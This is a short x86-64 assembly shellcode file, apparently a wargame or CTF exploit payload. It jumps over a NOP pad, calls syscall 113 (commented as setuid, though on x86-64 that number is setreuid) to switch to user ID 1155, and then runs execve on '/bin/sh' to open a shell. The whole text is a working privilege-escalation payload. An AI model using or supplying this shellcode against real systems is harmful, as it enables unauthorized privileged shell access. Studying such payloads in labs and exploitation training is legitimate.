BITS 64
  ; the first 9 bytes of this shellcode were
  ; overwritten
  jmp short 0x9

  nop
  nop
  nop
  nop
  nop
  nop
  nop
  nop

  ; setuid. euid is 1155
  ; rax: 113 (syscall number)
  ; rdi: 1155 (uid)
  ; rsi: 1155 (guid)

  ; rax and zero out rdx
  xor rax, rax
  cqo
  mov al, 113

  ; rdi
  xor rdi, rdi
  mov di, 1155

  ; rsi
  xor rsi, rsi
  mov si, 1155

  syscall

  ; execve. execve(*"/bin/sh", NULL, NULL)
  ; rax: 59
  ; rdi: pointer to /bin/sh string at the stack
  ; rsi: NULL (0)
  ; rdx: NULL (0)

  ; rax
  mov al, 59
  
  ; rsi
  xor si, si

  ; rdi
  mov rbx, 0x68732f2f6e69622f
  push rsi
  push rbx
  push rsp
  pop rdi

  syscall
